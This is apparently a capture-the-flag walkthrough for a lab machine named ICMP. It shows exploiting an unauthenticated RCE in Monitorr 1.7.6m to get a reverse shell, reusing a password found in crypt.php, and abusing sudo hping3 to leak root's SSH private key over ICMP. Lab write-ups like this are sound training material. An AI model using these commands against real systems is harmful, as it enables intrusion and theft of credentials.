ICMP

Target IP: 192.168.194.218

Scanning



There are two TCP ports open on the target machine: SSH and HTTP.

Enumeration

Port 80: HTTP

The webpage above is displayed. The screenshot above also informs us the version and name of the application which is Monitorr 1.7.6m.


Doing a Google search for this application shows it is vulnerable to unauthenticated RCE, and this exploit is verified too! Doing a directory search did not result in anything useful. I downloaded the exploit from above and saved it on my local machine.

Exploitation


I saved the exploit on my machine, and ran it against the target machine using the command python3 exploit.py http://192.168.194.218/mon/ 192.168.45.174 8443. Before I did this, I started a listener on my local machine at 8443. Then I launched the command above to execute the attack.


Then I received a reverse shell connection on my local machine at 8443! Now I have a foothold on the machine as www-data.

Privilege Escalation


During manual enumeration, I found the message above inside reminder. Apparently there is a file called crypt.php.


There is a directory called devel. I guessed the crypt.php is inside this directory and it is! I obtained the password BUHNIJMONIBUVCYTTYVGBUHJNI, and I was able to switch user to fox using this password!


Looks like we can run /usr/sbin/hping --icmp *.


Using ICMP, I transferred the SSH key of root using the commands below. Now I have the SSH password of user fox. I used this to open two SSH terminals to send the SSH key of user root.
The sender SSH fox#1 command: sudo hping3 --icmp 127.0.0.1 --sign signature --file /root/.ssh/id_rsa -d 4000 -c 2
The reciever SSH fox#2 command: sudo hping3 --icmp 127.0.0.1 --listen signature --safe.
